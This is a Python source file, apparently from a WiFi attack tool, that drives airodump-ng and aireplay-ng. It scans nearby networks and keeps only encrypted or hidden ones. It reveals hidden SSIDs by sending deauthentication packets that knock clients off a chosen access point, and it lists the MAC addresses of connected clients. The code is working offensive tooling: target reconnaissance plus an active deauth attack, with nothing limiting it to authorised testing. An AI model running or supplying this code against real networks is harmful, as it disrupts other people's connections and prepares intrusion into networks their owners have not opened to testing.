import os
import time
import signal
import subprocess
from dataclasses import dataclass
from utils import colored_log
from rich.console import Console
from mac_vendor_lookup import MacLookup  # Library to find vendor from MAC addr

# Rich console setup
console = Console()
mac_lookup = MacLookup()


@dataclass
class WiFiNetwork:
    id: int
    bssid: str
    channel: int
    power: int  # PWR in dBm
    essid: str
    encryption: str

    def __str__(self) -> str:
        # Convert PWR (dBm) to percentage (approximation: -100 dBm = 0%, -30 dBm = 100%)
        signal_percent = max(
            0, min(100, int((self.power + 100) * 1.42857))
        )  # Linear approximation
        # Get vendor name from BSSID
        try:
            vendor = mac_lookup.lookup(self.bssid)
        except Exception:
            vendor = "Unknown Vendor"
        return f"[bold][{self.id}][/bold] [bright_green]{self.essid}[/bright_green] ([green]{self.bssid}[/green]) - CH:{self.channel} PWR:{signal_percent}% ({self.power} dBm) [yellow]{self.encryption}[/yellow] - [magenta]Vendor: {vendor}[/magenta]"


def scan_networks(self) -> list[WiFiNetwork]:
    """Scan available wifi networks, filtering out open networks and sorting by signal strength"""
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface found")
        return []

    colored_log("info", "Starting WiFi network scan...")
    output_file = os.path.join(self.temp_dir, "scan-01.csv")

    # Start airodump-ng
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "-w",
            os.path.join(self.temp_dir, "scan"),
            "--output-format",
            "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(8)
    except KeyboardInterrupt:
        colored_log("warning", "Scanning stopped by user")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    networks = []

    # Parse CSV results
    if os.path.exists(output_file):
        try:
            with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()

            data_section = False
            network_id = 0

            for line in [l.strip() for l in lines]:
                if line.startswith("BSSID"):
                    data_section = True
                    continue
                if line.startswith("Station MAC"):
                    break
                if data_section and line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 14:
                        essid = parts[13].strip().replace("\x00", "")
                        encryption = f"{parts[5]} {parts[6]}".strip()
                        # Skip open networks (OPN)
                        if "OPN" in encryption.upper():
                            continue
                        # Detect hidden SSID (empty or <length: X>) for encrypted networks
                        if (
                            not essid or essid.startswith("<length:")
                        ) and "OPN" not in encryption.upper():
                            essid = "<HIDDEN SSID>"
                        network_id += 1
                        try:
                            networks.append(
                                WiFiNetwork(
                                    id=network_id,
                                    bssid=parts[0],
                                    channel=int(parts[3]) if parts[3].isdigit() else 0,
                                    power=(
                                        int(parts[8])
                                        if parts[8].lstrip("-").isdigit()
                                        else 0
                                    ),
                                    encryption=encryption,
                                    essid=essid,
                                )
                            )
                        except (ValueError, IndexError):
                            continue
        except Exception as e:
            colored_log("error", f"Error reading scan results: {e}")
    else:
        colored_log("error", "Scan results file not found")

    # Sort networks by signal strength (descending order)
    networks.sort(key=lambda x: x.power, reverse=True)
    # Reassign IDs after sorting
    for i, network in enumerate(networks, 1):
        network.id = i

    if networks:
        colored_log("success", f"Found {len(networks)} encrypted or hidden networks")
    else:
        colored_log("warning", "No encrypted or hidden networks detected")

    return networks


def decloak_ssid(self, network: WiFiNetwork) -> str | None:
    """Decloak a hidden SSID by capturing probe requests after deauthentication"""
    if network.essid != "<HIDDEN SSID>":
        return network.essid  # No need to decloak if SSID is already known

    colored_log("info", f"Attempting to decloak hidden SSID for BSSID {network.bssid}")
    output_file = os.path.join(self.temp_dir, "decloak-01.csv")

    # Start airodump-ng to capture probe requests
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--bssid",
            network.bssid,
            "--channel",
            str(network.channel),
            "-w",
            os.path.join(self.temp_dir, "decloak"),
            "--output-format",
            "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Send deauth packets to force clients to reconnect
    deauth_cmd = [
        "aireplay-ng",
        "--deauth",
        "10",  # Send 10 deauth packets
        "-a",
        network.bssid,
        self.monitor_interface,
    ]
    subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        time.sleep(10)  # Wait for clients to reconnect and send probe requests
    except KeyboardInterrupt:
        colored_log("warning", "Decloaking stopped by user")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    # Parse CSV to find SSID
    if os.path.exists(output_file):
        try:
            with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()

            data_section = False
            for line in [l.strip() for l in lines]:
                if line.startswith("BSSID"):
                    data_section = True
                    continue
                if line.startswith("Station MAC"):
                    break
                if data_section and line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 14 and parts[0] == network.bssid:
                        essid = parts[13].strip().replace("\x00", "")
                        if essid and not essid.startswith("<length:"):
                            colored_log("success", f"Hidden SSID decloaked: {essid}")
                            return essid
        except Exception as e:
            colored_log("error", f"Error reading decloak results: {e}")

    colored_log("warning", f"Failed to decloak SSID for {network.bssid}")
    return None


def detect_connected_clients(self, network: WiFiNetwork) -> list[str]:
    """Detect connected clients to the target network"""
    colored_log("info", f"Detecting connected clients for {network.essid}...")
    output_file = os.path.join(self.temp_dir, "clients-01.csv")

    # Start airodump-ng to detect clients
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--bssid",
            network.bssid,
            "--channel",
            str(network.channel),
            "--write",
            os.path.join(self.temp_dir, "clients"),
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(10)
    except KeyboardInterrupt:
        colored_log("warning", "Client detection stopped by user")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    clients = []

    # Parse client results
    if os.path.exists(output_file):
        try:
            with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()

            client_section = False
            for line in [l.strip() for l in lines]:
                if line.startswith("Station MAC"):
                    client_section = True
                    continue
                if client_section and line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 6 and parts[0].strip():
                        clients.append(parts[0])
        except Exception as e:
            colored_log("error", f"Error reading client detection results: {e}")
    else:
        colored_log("error", "Client detection results file not found")

    if clients:
        colored_log("success", f"Detected {len(clients)} connected clients")
    else:
        colored_log("warning", "No connected clients detected")

    return clients
